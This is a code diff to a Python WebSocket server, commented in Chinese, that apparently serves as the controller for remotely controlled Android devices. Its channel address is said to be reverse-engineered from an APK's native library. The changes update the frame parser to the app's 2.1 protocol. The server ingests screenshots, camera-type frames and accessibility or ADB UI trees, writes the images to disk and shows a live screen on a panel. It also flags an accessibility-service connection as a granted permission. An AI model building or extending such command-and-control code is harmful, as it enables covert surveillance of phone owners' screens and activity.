@@ -263,12 +263,16 @@ def _merge_diag_caps(rec, data):
     if not isinstance(data, dict):
         return
     perms = data.get('permissions') if isinstance(data.get('permissions'), dict) else {}
-    accessibility = bool(perms.get('accessibility'))
+    lifecycle_connected = (str(data.get('type') or '') == 'acc_lifecycle'
+                           and str(data.get('event') or '').lower()
+                           in ('onserviceconnected', 'service_connected', 'connected'))
+    accessibility = bool(perms.get('accessibility') or lifecycle_connected)
+    rec['last_diag'] = dict(data)
     info = rec.setdefault('caps', {}).setdefault('device_info', {})
     for key in ('brand', 'model', 'sdk', 'battery', 'charging'):
         if key in data:
             info[key] = data[key]
-    if 'accessibility' in perms:
+    if 'accessibility' in perms or lifecycle_connected:
         info['accessibility'] = accessibility
         granted = rec['caps'].setdefault('permissions', {}).setdefault('granted', [])
         marker = 'BIND_ACCESSIBILITY_SERVICE'
@@ -1387,8 +1391,8 @@ async def binary_device_socket(request):
     """被控端二进制通道：wss://<host>/ws/binary-device?deviceId=<id>
 
     通道**地址**来自 native 逆向（libnative-guard.so 的 N_buildWsUrl）。
-    帧格式见 `protocol/binary_proto.py`（本实现定义的完整协议：magic/version/type/seq/flags/
-    total/len/crc32 + payload，支持 16KB 分片与重组、逐片 CRC 校验、ack 回执）。
+    帧格式与 2.1 APK 一致：[1B type][4B 大端 payload 长度][payload]。
+    客户端一帧一条 WebSocket binary message，不分片、不等待 ACK。
     """
     import sys as _sys
     _sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'protocol'))
@@ -1400,7 +1404,6 @@ async def binary_device_socket(request):
     rec = STATE['devices'].setdefault(dev, {'ws': None, 'apkid': None, 'last_seen': time.time(),
                                             'first_seen': time.time(), 'caps': {}, 'shots': [],
                                             'msgs': [], 'frames': []})
-    reasm = bp.Reassembler()
     rec['binary'] = {'conn': True, 'frames': 0, 'bytes': 0, 'last': 0,
                      'types': {}, 'bad': 0, 'reassembled': 0, 'since': int(time.time())}
     outdir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'state', 'bin_frames', dev)
@@ -1415,46 +1418,53 @@ async def binary_device_socket(request):
             st['frames'] += 1
             st['bytes'] += len(msg.data)
             st['last'] = int(time.time())
-            fr = bp.parse(msg.data)
-            if not fr or not fr.get('ok'):
+            frames, parse_error = bp.parse_many(msg.data)
+            if parse_error:
                 st['bad'] += 1
                 continue
-            st['types'][fr['type_name']] = st['types'].get(fr['type_name'], 0) + 1
-            if fr['type'] == bp.T_HEARTBEAT:
-                await ws.send_bytes(bp.ack_for(fr['seq']))
-                continue
-            if fr['type'] in (bp.T_SCREEN, bp.T_CAMERA):
-                data = reasm.feed(fr)
-                if data is None:
+            for fr in frames:
+                st['types'][fr['type_name']] = st['types'].get(fr['type_name'], 0) + 1
+                data = fr['payload']
+                if fr['type'] == bp.T_HELLO:
+                    try:
+                        hello = json.loads(data.decode('utf-8'))
+                        rec['apkid'] = hello.get('apkId', rec.get('apkid'))
+                    except Exception:
+                        st['bad'] += 1
                     continue
-                st['reassembled'] += 1
-                st['dropped'] = reasm.dropped
-                ext = 'webp' if data[:4] == b'RIFF' else ('png' if data[:4] == b'\x89PNG' else 'bin')
-                name = '%d_%s.%s' % (int(time.time() * 1000), bp.TYPE_NAMES[fr['type']], ext)
-                fp = os.path.join(outdir, name)
-                with open(fp, 'wb') as fh:
-                    fh.write(data)
-                rec.setdefault('bin_shots', []).append(
-                    {'ts': int(time.time()), 'bytes': len(data), 'file': name, 'ext': ext})
-                # 落盘保留策略：不清理的话每帧 ~300KB × ~0.9 帧/秒 ≈ 37 GB/天，
-                # 写满盘之后服务端所有写操作都会失败（实测踩过：ENOSPC）
-                _prune_frames(outdir, rec, keep=KEEP_FRAMES)
-                if ext in ('png', 'webp'):
-                    # 面板实时画面就用这一份（设备端只在这里发像素，文本帧不再带图）
-                    rec['last_screen'] = {'ts': time.time(), 'png': data,
-                                          'w': None, 'h': None, 'src': 'binary'}
-                if len(rec['bin_shots']) > 200:
-                    del rec['bin_shots'][:-100]
-                await ws.send_bytes(bp.ack_for(fr['seq']))
-                _log_bin('重组完成 %s (%d B) -> %s' % (bp.TYPE_NAMES[fr['type']], len(data), name))
-                continue
-            await ws.send_bytes(bp.ack_for(fr['seq']))
+                if fr['type'] in (bp.T_SCREEN, bp.T_THUMB, bp.T_HD):
+                    st['reassembled'] += 1
+                    ext = ('jpg' if data[:3] == b'\xff\xd8\xff' else
+                           ('webp' if data[:4] == b'RIFF' else
+                            ('png' if data[:8] == b'\x89PNG\r\n\x1a\n' else 'bin')))
+                    name = '%d_%s.%s' % (int(time.time() * 1000), fr['type_name'], ext)
+                    fp = os.path.join(outdir, name)
+                    with open(fp, 'wb') as fh:
+                        fh.write(data)
+                    rec.setdefault('bin_shots', []).append(
+                        {'ts': int(time.time()), 'bytes': len(data), 'file': name, 'ext': ext})
+                    _prune_frames(outdir, rec, keep=KEEP_FRAMES)
+                    if ext in ('jpg', 'png', 'webp'):
+                        rec['last_screen'] = {'ts': time.time(), 'png': data,
+                                              'w': None, 'h': None, 'src': 'binary'}
+                    if len(rec['bin_shots']) > 200:
+                        del rec['bin_shots'][:-100]
+                    _log_bin('收到 %s (%d B) -> %s' % (fr['type_name'], len(data), name))
+                    continue
+                if fr['type'] in (bp.T_A11Y_TREE, bp.T_ADB_TREE):
+                    try:
+                        tree = json.loads(data.decode('utf-8'))
+                        rec['last_tree'] = {'ts': time.time(), 'tree': tree}
+                    except Exception:
+                        st['bad'] += 1
+                    continue
     finally:
         if 'binary' in rec:
             rec['binary']['conn'] = False
-            rec['binary']['dropped'] = reasm.dropped
-        print('[binary] 通道断开 device=%s（重组 %d，丢弃 %d）'
-              % (dev, reasm.completed, reasm.dropped), flush=True)
+            rec['binary']['dropped'] = 0
+        print('[binary] 通道断开 device=%s（已收 %d 帧，坏帧 %d）'
+              % (dev, rec.get('binary', {}).get('frames', 0),
+                 rec.get('binary', {}).get('bad', 0)), flush=True)
     return ws
 
 
@@ -1466,7 +1476,7 @@ async def api_binary_stats(request):
     st = dict(rec.get('binary', {'conn': False, 'frames': 0}))
     st.setdefault('dropped', 0)
     return web.json_response({'ok': True, 'deviceId': dev, 'binary': st,
-                              'protocol': 'MB/v1 24B header (magic,ver,type,seq,flags,total,len,crc32)',
+                              'protocol': 'APK 2.1: 1B type + 4B big-endian length + payload',
                               'shots': rec.get('bin_shots', [])[-20:]})
 
 
